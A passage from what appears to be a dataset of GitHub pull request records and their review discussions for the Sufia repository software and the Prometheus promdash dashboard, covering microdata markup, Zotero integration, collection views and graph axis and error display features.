broken tests in ScholarSphere that I was trying to fix. Where are the tests in Sufia for the microdata you are adding?  Maybe that is the first step.  You adding a PR with tests.  Then I can fix ScholarSphere.  At this point Sufia and ScholarSphere are entirely incompatible in the GenericFile Show page.  The extensive tests in ScholarSphere show what was broken by you in sufia.  Check out the feature tests here:  https://github.com/psu-stewardship/scholarsphere/blob/develop/spec/features/generic_file_show_spec.rb#L51-L100', ""@mjgiarlo The test will also help me to understand what you are trying to do.  My assumption was that the data keys were not necessarily as important as the data being posted in a reliable way, but if you could explain/ test what is really needed it would be much easier to make sure this feature continues to work.  Is anyone using the micro data?  What is it being used for.  Is it documented?  (I'll admit I have not gone back through all the documentation lately, but I did not see any test or documents in your PR."", '@cam156 See http://schema.org/docs/gs.html#microdata_how', '@jcoyne Thanks.  That documentation does not lead me to believe what I did was entirely wrong.  It seems better to have a standard format with itemtype and itemprop always set, than just a willy nilly format.  @mjgiarlo Maybe it is just a matter of setting the itemprop back instead of using the key?  Where did you get your itemprop names from?', ""@mjgiarlo @jcoyne @cam156 Just my 2 cents, but microdata's implementation is far from standardized.  It's well-documented in terms of how to put the mark-up into your page, but the which tags and all is a bit of a gray area.\r\n\r\nI put some microdata into the recent Rockhall catalog.  It was straight-forward for the marc record data, but not so much with EAD.  I found Google's rich snippets tool to be of help when trying to preview your work.  For example, here was my attempt to put microdata into a finding aid:\r\n\r\nhttp://www.google.com/webmasters/tools/richsnippets?q=http%3A%2F%2Fcatalog.rockhall.com%2Fcatalog%2FARC-0008\r\n\r\nA marc record looks a little better:\r\n\r\nhttp://www.google.com/webmasters/tools/richsnippets?q=http%3A%2F%2Fcatalog.rockhall.com%2Fcatalog%2F179803341\r\n\r\nAnyway, the point of all of this is, it's impossible to accurately see your microdata until it's out there.  You can do some previewing with Google's tool by pasting the html in, or possibly looking at it from localhost--dunno about that one.  So I would say if you've got a working example, go ahead and merge it (warts and all) and then tweak it later once you can see how it's actually behaving.\r\n"", 'In the original ""based_near"" and ""contributor"" have a ""name"" itemtype nested within another itemtype. ""description"" did not have a itemtype.  I\'m not sure if that the correct behavior, but that was the behavior before this PR.', ':+1: to the new changes!']"
433,projecthydra/sufia,545.0,"Fixes hydra-editor style partials in views/records.

refs gwu-libraries/gw-sufia#82
refs gwu-libraries/gw-sufia#25","[""@flyingzumwalt does this PR include a user's ability to edit permissions on a collection?"", '@awead This PR is just increasing the number of metadata fields shown in the edit & show views.  Adding the ability to edit permissions on a collection is a separate feature (which I might work on - see gwu-libraries/gw-sufia#78)', ""nice!  That's something we would like as well, but I don't think it's in scope for our Scholarsphere 2.0 release.  "", 'Looks like this is clear to merge then? :question: ', 'Taking a look!', ""This will probably require a lot of overrides to Scholarsphere, but we're in the middle of re-vamping the collection views anyway, so I think all-in-all :+1: but I defer to @mjgiarlo "", 'Which reminds me... we ought to get a 4.0.0 version cut so we can have a stable base (for SS 2.0) and start slating other features for subsequent versions.', '@awead To some extent I think these changes may not show up because we have this in sphere:\r\n\r\nhttps://github.com/psu-stewardship/scholarsphere/blob/develop/app/models/collection.rb#L26\r\n\r\nWorth some testing, of course.', ""Left a couple comments.  In particular, I'm confused about how this works if both collections and files use the shared records/show_fields/ partials, given that some of these partials use solr_name values that point to the properties ds and others point to the descMetadata ds."", ""+1 to getting a stable 4.0  I'm good with adding additional fields as long as it is not too hard to override.  FYI collection title and description are singular fields now, not multiple fields like generic file.  I am not sure how this affects this PR, if at all..."", ""Applied that fix to the _creator partial and switched the itemprop from Thing to Agent on creator and contributor. \r\n\r\n@cam156 the view handles that mismatch.  It looks like it's working fine -- those fields appear as single-value on collections and multivalue for files.  (Note -- this is actually relevant for #547, but either way, it's handled by the code)"", ':+1: ']"
434,projecthydra/sufia,548.0,...e the file name in the url.,[]
435,projecthydra/sufia,555.0,"Minor fixes for padding, table lines, and hiding the cog using CSS.","['Looks good. Do you want to squash your commits?', 'Yes. I will work on squashing my commits. Thanks!']"
436,projecthydra/sufia,550.0,refs gwu-libraries/gw-sufia#80,"[':+1: Looks good other than the comment being removed', ""I'm really against inflating the gem with jars.  This will adversely impact our ability to use the gem in low-bandwidth situations.  Can we move that to a script that downloads them or just add to the readme?  Otherwise, put those in a separate gem."", ""I'm cool with moving the jars out of the repo and setting up a rake task for grabbing them.  Build isn't passing so I have some more work to do, anyway.\r\n\r\nI'm not sure how the app/test suite will behave if someone grabs Sufia and doesn't pull down the jars, however."", 'I wonder if there is a way to make the generator fetch the jars.  In SS the jars live in solr_conf https://github.com/psu-stewardship/scholarsphere/tree/develop/solr_conf/lib/extraction/lib\r\nMaybe the generator could go ahead and download the jars there?', ""I tried to pull them in via git subtree (see commits above), but I'm not sure if this achieved the desired effect or just kept them in the gem in a more convoluted way. :)  Still deciding the most maintainable way to do this."", ""OK, I've now got a rake task that grabs the jars directly from maven.org and pops them in jetty/solr/lib/contrib/extraction."", ""@jcoyne @cam156 I believe I've responded to all of your feedback now.  Thanks much for the review -- this is much better because of your guidance""]"
437,projecthydra/sufia,561.0,"This addresses two needs for us:

* total files in a collection
* size of the collection in bytes, megabytes, etc.

The first one is easy, but the second required some additional model methods.","[':+1:  Looks good to me!', '@jcoyne good?', 'All comments and feedback have been incorporated into the PR and the build is passing, so :shipit:']"
438,projecthydra/sufia,585.0,Couple of minor adjustments to get Sufia working with the latest Hydra gems.,"['@awead I took a stab at retracting the Trophy changes.  They run for me locally.  We will see what Travis thinks...  You can just drop this commit if it is not helpful...', '@jcoyne @cam156 k. this has the changes we talked about this morning.', ':+1: Looks good to me.  @jcoyne good to merge?', ':+1: ']"
439,projecthydra/sufia,613.0,"Creates `Sufia::Permissions::Readable` and `Sufia::Permissions::Writable` modules, which can be used in the models or isolr documents.  Helper methods take care of displaying labels with the pertinent information.","[""@awead don't use `be_truthy` when you mean `be true`, the latter is a lot more specific."", ""@jcoyne @mjgiarlo \r\nTake a look... I've combined both your ideas, and modularized things a bit more.  There is a Readable and Writeable module that's included in Sufia::GenericFile::Permissions.  This enables users to create another kind of model that will follow the same permissions as GenericFile."", '@jcoyne and I are on a :telephone_receiver: from 1pm-3pm ET, but I imagine one of us will take a :eyes: before long.  Thx, @awead.']"
440,projecthydra/sufia,622.0,"This is to address a problem where a long list of files is displayed for a batch upload:
![bad](https://cloud.githubusercontent.com/assets/312085/3802348/30b45e34-1c0e-11e4-9a44-a51656187d45.png)
Using the popover feature in Bootstrap, it'll look something like:
![good](https://cloud.githubusercontent.com/assets/312085/3802357/54e188cc-1c0e-11e4-8947-d1ee0d81d9d1.png)
and the files are displayed in the popover when the user clicks on the link, and they can click and individual file from there.

To do this, I refactored `BatchUpdateJob` to include the new class `Sufia::Messages` which mixes in some html-ish-ness.  I'm not sure about this solution, as it's mixing in html display stuff into a class that's under `lib`. Another option would be to use Rails' `AbstractController` and use an actual view to render the html that's going in the email message.  Thoughts?

Also, note the `sanitize_text = false` option in `#send_message`.  This is needed to render the complex bits of html, otherwise, it's just removed.

Comments?
@jcoyne @mjgiarlo @cam156 

",[]
441,projecthydra/sufia,633.0,"The path can be more than 255 characters which messes with Fedora...

If the path is long (which happens with browse-everything/Box integration) you get the following error...
ERROR 2014-08-07 21:38:35.383 [http-apr-8080-exec-25] (DatastreamResource) Unexpected error fulfilling REST API request
org.fcrepo.server.errors.ValidationException: Datastream label is too long. Maximum length is 255 characters.

The browse-everything integration passes back a file name which is set to the label here: https://github.com/projecthydra/sufia/blob/master/app/controllers/concerns/sufia/files_controller/browse_everything.rb#L26","['@cam156 Are there cases when the label is blank and the path is more that 255 characters long?', '@awead Not sure.  I have not run into them, but we could truncate the path just to be certain', ':+1: ', ""Shouldn't you fix the problem here: https://github.com/projecthydra/hydra-head/blob/f52fe88785b2ab4c30ad373f25ca3e618b333d5f/hydra-core/app/models/concerns/hydra/model_methods.rb#L26 ?"", '@jcoyne possibly the truncation should be put there, but I think the label vs path logic should stay in sufia.  There seemed no harm in also truncating, but I can go back to my original PR without the truncation if you prefer.']"
442,projecthydra/sufia,649.0,This creates a builder class for rendering breadcrumbs.  It's an exact copy of Spotlight's code and is designed to be used with Boostrap's breadcrumb styles.  It can be easily overridden for any local implementor's needs.,['@jcoyne this is all fixed up']
443,projecthydra/sufia,718.0,...d this was confusing,[':+1: ']
444,projecthydra/sufia,796.0,,"[""I've made the changes requested by @mjgiarlo "", ':+1: ']"
445,projecthydra/sufia,789.0,"I wasn't able to finish this story by the end of the sprint, so @cam156 asked me to open a pull request so that another developer can pick up the rest of the story.

As far as I know, there are 4 main things left to do:

.1. Fix disabled auto-complete

I replaced the javascript for creating the add/remove buttons next to each field in the edit form with the javascript that I took from curate.

The old javascript:  app/assets/javascripts/sufia/multiForm.js
The new javascript:  app/assets/javascripts/sufia/manage_repeating_fields.js

Sufia had some auto-completion behavior attached to those old fields, so I had to disable the auto-complete functionality while I was working on the views.  I left a TODO message in the file where it is disabled to make sure to go back and fix it:
app/assets/javascripts/sufia/edit_metadata.js

Once the autocomplete is fixed, you can probably delete app/assets/javascripts/sufia/multiForm.js entirely.

.2. Style changes

When you are editing a file, there are 3 tabs.  I have already updated the javascript, views, and styles for the ""Descriptions"" tab, but I haven't had time to work on the ""Permissions"" tab yet.  It looks like the ""Permissions"" tab has its own javascript.  That javascript seems to be working just fine, so maybe it's best not to mess with it, but you might want to update the styles of the adder buttons so that they look like the buttons on the ""Descriptions"" tab.

.3. Upgrade version of hydra-editor in gemspec

I ran ScholarSphere with sufia pointing to this branch.  Then I tried to edit a file in ScholarSphere, but I got an error about calling a method with the wrong number of arguments.

The error is caused by the partial_exists? method in hydra-editor
(app/helpers/concerns/records_helper_behavior.rb)

That method has 1 argument on master of hydra-editor, but it has 2 arguments in hydra-editor 0.4.0.

So, sufia's gemspec needs to be pegged to a higher version of hydra-editor, or else that method needs to be overridden in sufia.

.4. Add something to the release notes

People who upgrade sufia might experience breaking changes, especially if they have overridden the views.","['How much of this was superseded by #819, @jcoyne ?  Should we keep it open?', '@mjgiarlo all of this will be superceded by #819, but this targets Sufia 5 and #819 is for Sufia 6', 'This is ready for commenting. The auto complete has been fixed.  I think we will leave permissions alone for the moment, and I think it would be better to update ScholarSphere to the latest hydra-editor, instead of pinning sufia down.', ':+1: ', '@jcoyne :grey_question: ', ':clap: tutti bravi!']"
446,projecthydra/sufia,855.0,The controller error was already fixed as part of story 9713.  I just made a change to the form to disable the radio button option for the current version so that the user cannot submit an invalid version.,"['@val99erie Looks like you need to rebase so this can merge cleanly.', '@jcoyne - I added a new gray color.  The existing $gray-medium was too light to see against the gray background, and the $gray-dark was indistinguishable from the text for the non-disabled options.', ':+1: ']"
447,projecthydra/sufia,879.0,,[]
448,projecthydra/sufia,925.0,...ss name.  fixes #916,"['@mjgiarlo It got a bit loopy, but I added I18N in.  Can you think of a better way?', 'Works for me, @cam156 :+1: ']"
449,projecthydra/sufia,1022.0,"Integration with Zotero-managed publications is possible using [Arkivo](https://github.com/inukshuk/arkivo). Arkivo is a Node-based Zotero subscription service that monitors Zotero for changes and will feed those changes to your Sufia-based app. [Read more about this work.](https://www.zotero.org/blog/feeds-and-institutional-repositories-coming-to-zotero/)

To enable Zotero integration, first [register an OAuth client with Zotero](https://www.zotero.org/oauth/apps), then [install and start Arkivo-Sufia](https://github.com/inukshuk/arkivo-sufia) and then generate the Arkivo API in your Sufia-based application:

```
rails g sufia:models:arkivo_api
```

The generator does the following:

* Enables the API in the Sufia initializer
* Adds a database migration
* Creates a routing constraint that allows you to control what clients can access the API
* Copies a config file that allows you to specify the host and port Arkivo is running on
* Copies a config file for your Zotero OAuth client credentials

Update your database schema with `rake db:migrate`.

Add unique Arkivo tokens for each of your existing user accounts with `rake sufia:user:tokens`. (New users will have tokens created as part of the account creation process.)

Edit the routing constraint in `config/initializers/arkivo_constraint.rb` so that your Sufia-based app will allow connections from Arkivo. **Make sure this is restrictive as you are allowing access to an API that allows creates, updates and deletes.**

Tweak `config/arkivo.yml` to point at the host and port your instance of Arkivo is running on.

Tweak `config/zotero.yml` to hold your Zotero OAuth client key and secret. Alternatively, if you'd rather not paste these into a file, you may use the environment variables `ZOTERO_CLIENT_KEY` and `ZOTERO_CLIENT_SECRET`.

Restart your app and it should now be able to pull in Zotero-managed publications on behalf of your users. Each user will need to link their Sufia app account with their Zotero accounts, which can be done in the ""Edit Profile"" page. After the accounts are linked, Arkivo will create a subscription to that user's Zotero-hosted ""My Publications"" collection. When users add items to their ""My Publications"" collection via the Zotero client, they will automatically be pushed into the Sufia-based repository application. Updates to these items will trigger updates to item metadata in your app, and deletes will delete the files from your app.","[""Has there been any thought to making this a plugin/add-on gem for Sufia rather than something that ships with Sufia by default?  It's not something that everyone would use, and I think Sufia is already pretty complex and hard to test."", ""Quoth @jcoyne:\r\n> Has there been any thought to making this a plugin/add-on gem for Sufia rather than something that\r\n> ships with Sufia by default? It's not something that everyone would use, and I think Sufia is already\r\n> pretty complex and hard to test.\r\n\r\nGood question. Yes, in fact that was my starting point, but I was under the gun to get something running very quickly and I opted not to create that layer of abstraction rather than create a rushed, wrong layer of abstraction.  I spent a couple days trying to make that work and just couldn't, so I moved on and put it right in Sufia."", ""I tested this with my sufia based apps.  Without it being enabled, it didn't affect the applications.  Enabling it functioned as expected."", ':clap: @grosscol \r\n\r\nThanks much.']"
450,projecthydra/sufia,1136.0,Fixes #1127 ,[]
451,projecthydra/sufia,1126.0,,"['@yinlinchen I believe the work already includes the GenericFile::Metadata here: https://github.com/projecthydra/sufia/blob/pcdm/sufia-models/app/models/concerns/sufia/works/generic_work.rb#L9\r\nThis ticket was talking about overriding the to_solr method on the GenericWork to include file level metadata in the solr document for the work.  Like: https://github.com/projecthydra/sufia/blob/pcdm/sufia-models/app/models/concerns/sufia/works/curation_concern/human_readable_type.rb#L15-L20\r\n\r\nSorry that the ticket was misleading ', ""@yinlinchen It seems works should have it's own indexing based on @jcoyne rdf label assertion.\r\nTo make the file above be used you would need to https://github.com/projecthydra/sufia/blob/pcdm/sufia-models/app/models/concerns/sufia/works/generic_work.rb#L9 to include your file in this PR.  That would be one step towards fixing 994""]"
452,projecthydra/sufia,1168.0,,[]
453,projecthydra/sufia,1169.0," the query. fixes #1151 

In addition I refactored the catalog controller test to use only solr instead of fedora to speed up the tests by half even though I added 3 additional tests.","['Can you please add a test for search_builder.rb so we can see that the correct queries are being created given different input?', ""@jcoyne the reason I went away from search_builder.rb test is you are really just looking at strings.  The real test is if they do what you want them to do in the controller.  I'm not sure I see the value to adding those test."", '@cam156 if these tests in the controller start failing, I\'d want to know ""Are we sending the correct query to solr?"" But presently we don\'t have tests that can help us answer that question.', ""@jcoyne Ok, but I'm just really worried about test bloat.  Our test is extremely long as it is..."", '@cam156 Fortunately testing the SearchBuilder should be really fast since there are no external API calls.', '@jcoyne added tests for the new search builder method and move the internal methods to protected. ', ':+1:  Looks good to me.']"
454,projecthydra/sufia,1177.0," and single use link javascript

Updated the spec runner to not fail on multiples of 10 and to output the number of jasmine tests run on passing to make it more transparant how many jasmine tests are running.","['@mjgiarlo Thanks for the comments.  Fixed up the areas and added your suggestion.', ':shipit: ']"
455,projecthydra/sufia,1203.0,We added the ability to un-feature an item from the item page. We chose to add the link to improve the workflow to feature and un-feature an item. Fixes #1202 ,"['@luisgreg99 has a CLA on file.', '@luisgreg99 if you can get us a signed iCLA, then we can move forward with the merging process. You can email legal@projecthydra.org to get the process started.', '@awead Should be on file already.', ""@terrellt @luisgreg99 Indeed it is. I just confirmed... It's my turn to offer apologies!"", '@awead In the future, is there a good way to confirm that an iCLA is on file?', '@terrellt There\'s a link from this page: https://wiki.duraspace.org/display/hydra/The+Hydra+Project\r\nto ""Hydra Licensed Contributors"" which lists all the folks that have their iCLAs on file, but it requires a login. If you don\'t have one, request one \'cause you all should have that.', '@luisgreg99 This PR needs to be rebased with the latest master.']"
456,projecthydra/sufia,1217.0,,"['@mjgiarlo Thanks for the comments.  I fixed where appropriate.', ':+1: ']"
457,projecthydra/sufia,162.0,,"['Comments above not blockers, I should clarify. Otherwise :+1: ']"
458,prometheus/promdash,96.0,Graph error notifications are currently handled via the console or an alert. Come up with some meaningful way to communicate these errors to the user.,"['Putting this up to start a discussion on how best to display the errors, how they should behave (I dropped it into a timeout, but should they persist until a successful request or the user acknowledges the error..?), and anything else that comes to mind.', 'Ok, here\'s one example of how error query reporting could work:\r\n\r\n- When a graph is refreshed and any of the queries has an error, a `!` icon (or similar ""attention"" icon) appears in the graph\'s title pane.\r\n\r\n- In the simplest version, hovering over the error icon will show all query errors as a `title` tooltip. In a more advanced version, the title tooltip would only say, ""n errors"" and the icon would be a button which upon click would expand a pane showing detailed error messages.\r\n\r\n- In both cases (simple and advanced version), the error messages should clearly indicate which expression they are from. Like: ""Expression 1: &lt;error message&gt;"".\r\n\r\n- Errors for a graph should be cleared when there is a new refresh. Meaning, only the errors that happened in the latest graph refresh should be shown.\r\n\r\n- There doesn\'t necessarily need to be a way to ""click away"" error messages. Instead, one should take care of fixing the underlying problem (bad expression or malfunctioning server) and refresh the graph until errors are gone.', ""and, feedback time. I've been putting in bogus queries and I don't get anything logged to the console, though. The only error I've been able to use has been when I'm not running an instance of prometheus.\r\n\r\nerrors:\r\n![screen shot 2014-03-27 at 10 22 52 pm](https://cloud.githubusercontent.com/assets/1398104/2545729/09c8b396-b620-11e3-97b0-012cc35e3241.png)\r\n\r\nhover, one error\r\n![screen shot 2014-03-27 at 10 23 01 pm](https://cloud.githubusercontent.com/assets/1398104/2545728/09c8a9b4-b620-11e3-92e6-c7b9e45a077b.png)\r\n\r\nhover, multiple errors\r\n![screen shot 2014-03-27 at 10 23 29 pm](https://cloud.githubusercontent.com/assets/1398104/2545727/09c7d64c-b620-11e3-8ef4-dc0a8a18add8.png)\r\n\r\nafter clicking on the exclamation (clicking the exclamation again hides the panel)\r\n![screen shot 2014-03-27 at 10 23 39 pm](https://cloud.githubusercontent.com/assets/1398104/2545726/09c7a500-b620-11e3-8147-48eb35b2e143.png)\r\n\r\nthe exclamation will hide if there are no errors after a graph refresh."", 'Only on mobile right, but without a look at the code, that looks really\nawesome! Great work :)\nOn Mar 27, 2014 10:26 PM, ""stuart nelson"" <notifications@github.com> wrote:\n\n> and, feedback time. I\'ve been putting in bogus queries and I don\'t get\n> anything logged to the console, though. The only error I\'ve been able to\n> use been when I\'m not running an instance of prometheus.\n>\n> errors:\n> [image: screen shot 2014-03-27 at 10 22 52 pm]<https://cloud.githubusercontent.com/assets/1398104/2545729/09c8b396-b620-11e3-97b0-012cc35e3241.png>\n>\n> hover, one error\n> [image: screen shot 2014-03-27 at 10 23 29 pm]<https://cloud.githubusercontent.com/assets/1398104/2545727/09c7d64c-b620-11e3-8ef4-dc0a8a18add8.png>\n>\n> hover, multiple errors\n> [image: screen shot 2014-03-27 at 10 23 01 pm]<https://cloud.githubusercontent.com/assets/1398104/2545728/09c8a9b4-b620-11e3-92e6-c7b9e45a077b.png>\n>\n> after clicking on the exclamation (clicking the exclamation again hides\n> the panel)\n> [image: screen shot 2014-03-27 at 10 23 39 pm]<https://cloud.githubusercontent.com/assets/1398104/2545726/09c7a500-b620-11e3-8147-48eb35b2e143.png>\n>\n> the exclamation will hide if there are no errors after a graph refresh.\n>\n> --\n> Reply to this email directly or view it on GitHub<https://github.com/prometheus/promdash/pull/96#issuecomment-38883342>\n> .\n>', ""The error message styling doesn't work in the light theme yet, right?\r\n\r\nI like the general look though!"", 'right, I was only styling off the dark theme (cause the dark theme is the theme everyone should be using :P). Will expand it to include the light theme soon.', 'hm, let me know what you think', 'Yay, looks really nice! :+1: Please squash :)']"
459,prometheus/promdash,111.0,"Add support for logarithmic scales, and the ability to set per-expression between it or linear.

I also updated d3.js from v2 to v3.

addresses #23 ","['Regarding setting interpolation method and stacked/lines on a per-series basis:\r\nBoth of these are both set on either a per graph basis.\r\nhttps://github.com/prometheus/promdash/blob/master/app/assets/javascripts/angular/directives/graph_chart.js#L91\r\nhttps://github.com/prometheus/promdash/blob/master/app/assets/javascripts/angular/services/rickshaw_data_transformer.js#L45\r\n\r\nIt appears that we might be able to set stacked/line on a per-expression basis if we separate out series into its separate expressions, call `Rickshaw.Series.zeroFill(series)` on them as appropriate, and then merge the series arrays back into one and return that from the data transformer.', 'Hmm, even though the lines are scaled differently depending on ""log"" or ""linear"", the axis now is always logarithmic?\r\n\r\n![no_linear](https://cloud.githubusercontent.com/assets/538008/2602758/a74a3172-bb24-11e3-91a5-04b8926865ac.png)\r\n', ""- More than two axes: would be only a nice-to-have, but ok to have only two for the moment. I'm assuming (maybe wrongly, no idea) that it could be a lot of extra work to support more than that, design-wise.\r\n\r\n- Per-expression interpolation and stacked/line settings: actually, this is also pretty nice-to-have for now. Maybe for the sake of complexity reduction, we should omit it from this PR. It might be interesting to add at least the stacked/line per series later. http://code.shutterstock.com/rickshaw/examples/multi.html shows what's possible :)"", 'When configuring a second axis, I would expect to see a second axis on the right of the graph, but there is no second axis? The expression is also configured to use that second axis.\r\n\r\n![no_second_axis](https://cloud.githubusercontent.com/assets/538008/2602864/83c2ba06-bb26-11e3-967f-de570f8c3fad.png)\r\n', 'Regarding title, orientation, and format: format would be very nice to have! The other two we can omit for now as long as we have only two axes.', ""**Second Axis:** Currently commented out, will be added back in soon.\r\n**Format:** Will do, shouldn't be difficult.\r\n**Per expression stack/line:** The example looks a lot like what I was thinking of doing, so that's good. Should be able to put that in no problem. It will probably involve copying how they are setting stacked/lines (which would easily open this up for bar/scatter plot) and changing our current implementation where the entire series is passed to Rickshaw and modified.\r\n\r\n**More than two axes:** Programmatically it would be easy to set this (change the axis setting, then tell the expression which axis it should render based on), but visually, like you said, I think having more than two axes presents a very real design problem. Off the top of my head I can't think of a good way to show an additional y-axis in our 2-dimensional graph, and not showing an axis would also be just as bad (data with no scale isn't too helpful).\r\n\r\nThis is an awesome PR. I'm going to NYC this weekend so I'll try to get as much done as possible, but it probably won't get dealt with until Sunday."", ""Yep, totally fine!\r\n\r\nThe way I've seen >2 axes done in the past is to simply draw them next to each other. Like this in Highcharts: http://www.highcharts.com/demo/combo-multi-axes"", 'When selecting the ""numeric"" format, sometimes the values are displayed as integers, other times in scientific notation (`1e+3`, e.g.). Looking into it.', ""Axis1 and Axis2 are hard coded to the left and right sides of the chart, respectively. Either can be configured to be logarithmic/linear, stack/line, and kmbt/numeric (see note above about numeric bug). I can work for adding a third and fourth axis (again on the left and right, respectively), but I think that would be better left for a separate PR.\r\n\r\nI wasn't able to find an immediately apparent way to set a per-series interpolation method, but I will look more to see if I find it.\r\n\r\n![screen shot 2014-04-07 at 10 03 27 pm](https://cloud.githubusercontent.com/assets/1398104/2639256/38f826e2-bec2-11e3-8970-77858415733d.png)\r\n![screen shot 2014-04-07 at 10 03 43 pm](https://cloud.githubusercontent.com/assets/1398104/2639257/38f84f96-bec2-11e3-8396-2c42f280865a.png)\r\n"", ""Also, if there's interest, it is trivial to add support for scatter plots and bar charts at this point. Literally just would have to add the radio buttons and bind them to the right values:\r\n\r\n![screen shot 2014-04-07 at 10 21 03 pm](https://cloud.githubusercontent.com/assets/1398104/2639339/a5ef4576-bec4-11e3-9026-565fd5e64a9b.png)\r\n![screen shot 2014-04-07 at 10 21 41 pm](https://cloud.githubusercontent.com/assets/1398104/2639340/a5effb56-bec4-11e3-8dd5-8936f2c7fc8e.png)\r\n"", 'Regarding bar charts and scatter plots: I think the useful thing about them is that they make visible where you actually have data points vs. just long, interpolated lines. I guess including at least scatterplot would be a good idea.', 'Ok, I\'ve been doing some blackbox testing and found some more bugs that I would like to see fixed before doing a more thorough code review:\r\n\r\n- When you add a new graph with a simple query, it won\'t render at all, because the linear/log is completely unset. Even setting one of linear/log doesn\'t help until you save and reload the page.\r\n\r\n- Same for adding a new axis in an existing graph.\r\n\r\n- The right axis prevents graph deletion because it covers up the graph\'s deletion button. z-index or height adjustment required?\r\n\r\n- Removing a second expression from a graph doesn\'t remove it from the drawn graph. Not sure if this bug was introduced earlier or by this.\r\n\r\n- When log scale is set: If a query expression produces both negative and positive values, it produces a Javascript error: `Error: Problem parsing d=""M0,4.002475247524785Q1.8985732814526592...`. (there are a lot of NaNs in there).\r\n\r\n- When log scale is set: If a query expression only produces negative results, the line is drawn like in linear mode, and no axis labels show up at all?', 'Regarding query expressions with both positive and negative values:\r\nhttps://github.com/mbostock/d3/wiki/Quantitative-Scales#log-scales\r\n\r\n>The mapping to the output range value y can be expressed as a function of the input domain value _`x: y = m log(x) + b`_. As log(0) is negative infinity, a log scale must have either an exclusively-positive or exclusively-negative domain; the domain must not include or cross zero.', '>When log scale is set: If a query expression only produces negative results, the line is drawn like in linear mode, and no axis labels show up at all?\r\n\r\nThe axis is also not drawn for me in logarithm scale. What is more troubling is that if your values are negative on the initial graph draw, the scale is far larger than it should be (check it in linear scale). Since the scale is so large, your data appears to be a straight line.\r\n\r\nIf you have positive data first, then multiply your expression by `-1` and refresh the graph, then it correctly draws the negative values on the graph with the right magnitude for the y-axis. Doing it this way I was able to draw a logarithmic scale graph with all negative values and get the y-axis to show.\r\n\r\nIt seems there is a bug in the initial render when the values are all negative. This is not present on master, however, so it must have been introduced in this PR.', ""The y-axis magnitude had some funny behavior when both yMax and yMin are negative values.\r\n\r\nI've intermittently run across the issue where the logarithmic axis isn't drawn. I can't reliably reproduce it. Restarting my prometheus server has fixed the issue, but I'm not sure how that would be responsible for getting the logarithmic graphs to draw.\r\n\r\nIt does like nice, though.\r\n![screen shot 2014-04-08 at 11 02 54 pm](https://cloud.githubusercontent.com/assets/1398104/2651643/7e614de0-bf93-11e3-8276-5524c5dab8ce.png)\r\n"", "">Removing a second expression from a graph doesn't remove it from the drawn graph. Not sure if this bug was introduced earlier or by this.\r\n\r\nJust checked this on master and it seems to be there as well."", "">The right axis prevents graph deletion because it covers up the graph's deletion button. z-index or height adjustment required?\r\n\r\nHad an extra element cluttering up the markup, removed it."", "">- When you add a new graph with a simple query, it won't render at all, because the linear/log is completely unset. Even setting one of linear/log doesn't help until you save and reload the page.\r\n- Same for adding a new axis in an existing graph.\r\n\r\nThink these are both fixed."", ""Barring any unseen bugs, I'm planning on extracting as much as possible to services tomorrow. The poor `graph_chart` has become a jungle.\r\n\r\nThanks for your patience on this one, it ended up being more complicated than I originally imagined."", ""Cool, thanks for the updates! Yeah, this is a monster change, simply due to all the unforeseen interactions between different settings. As they say, software complexity doesn't grow linearly with features, but quadratically! At least when the features interact.\r\n\r\nYes, please take your time rather than hurry it through. Don't hesitate to give this several more days if that's required to make it all clean, working, and nice!"", ""Initially I removed the individual `axis.render()` calls because this method is pushed into the owning graph's list of callbacks. This ended up becoming a problem when attempting to remove an axis. While I could remove the axis and its associated markup, the graph was holding onto a reference to the y-axis, causing it to be re-rendered. Consequently, I have to remove all of the callbacks on the graph and manually render its components. I left a comment to this effect in the code."", 'I think this is ready to be checked. I have found some intermittent (rare) failures when attempting to create graphs, but they appear to be restricted to certain expressions and settings combinations (e.g. logarithmic scale and a data series that spans 0, `prometheus_metric_disk_latency_microseconds` and its variants won\'t render as `stack`). I don\'t know if this is an issue with my data, or an issue with Rickshaw, or the code I wrote.\r\n\r\nI ran through several ""paths"" of what I would consider normal use for setting up graphs and except for some of the odd cases I mentioned above it seems to be working.\r\n\r\n', 'Hey, cool, this is already working much better. I still found some important issues though:\r\n\r\n- If I have two axes, they show the same Y-range, even if the expressions mapped against them have very different ranges. To reproduce, create two axes with linear mode and two expressions, one for each axis: `up{job=""prometheus""}` and `up{job=""prometheus""} * 1000`. The value of the first will be `1`,  the second will be `1000`. The 2 axes will look the same, although one axis should have its max value close to 1, while the should have a max close to 1000. This is really important, as the primary usefulness of having two axes is having them be at different scales/ranges so you can see and compare values from two different metrics that have very different magnitudes.\r\n\r\n- When I remove an expression, it\'s still not removed from the graph, even at refresh. Since this is in master, I guess you prefer fixing it in another PR?', 'If I understand correctly, in your example you should have a horizontal line for both `up` and `up*1000`. If `up` is mapped to `axis1`, and `up*1000` is mapped to `axis2`, the the range on `axis1` should be 0-1, and the range on `axis2` should be 0-1000. Within the graph, lines for `up` and `up*1000` should be overlapping since they are both at the maximum for their respective axes. Am I understanding this correctly?', ""Yep, exactly. In that trivial example, the lines would match up exactly and\nyou wouldn't be able to tell them apart. In a more realistic example, you\nmight want to compare something like CPU usage with network bandwidth\nusage, which would then give you a really useful graph even though their\nranges are very different.\n\n\nOn Fri, Apr 11, 2014 at 1:16 AM, stuart nelson <notifications@github.com>wrote:\n\n> If I understand correctly, in your example you should have a horizontal\n> line for both up and up*1000. If up is mapped to axis1, and up*1000 is\n> mapped to axis2, the the range on axis1 should be 0-1, and the range on\n> axis2 should be 0-1000. Within the graph, lines for up and up*1000 should\n> be overlapping since they are both at the maximum for their respective\n> axes. Am I understanding this correctly?\n>\n> --\n> Reply to this email directly or view it on GitHub<https://github.com/prometheus/promdash/pull/111#issuecomment-40154078>\n> .\n>"", 'let me know what you think', 'How do I assign metrics (how do you call a single line?) to an axis? I have a chart with HTTP response codes. 2xx, 3xx, 4xx all in the range of 1000+, 5xx in the range of 0-20. I want to have the left y-axis show a meaningful scale for the first three metrics, the right y-axis should show lower values for the 5xx response codes.', 'You can only set an expression to an axis, you cannot set individual series within an expression to different axes.', 'I just saw that. Given that there is now regexp support, I can live with\nthat, but it would make several graphs easier if it were possible to assign\nseries of the same expression to axes. Same for colors and chart type.\nMight make things more complicated though.\n\n\nOn Fri, Apr 11, 2014 at 8:10 PM, stuart nelson <notifications@github.com>wrote:\n\n> You can only set an expression to an axis, you cannot set individual\n> series within an expression to different axes.\n>\n> --\n> Reply to this email directly or view it on GitHub<https://github.com/prometheus/promdash/pull/111#issuecomment-40265993>\n> .\n>', 'Oh, immeasurably so :)']"
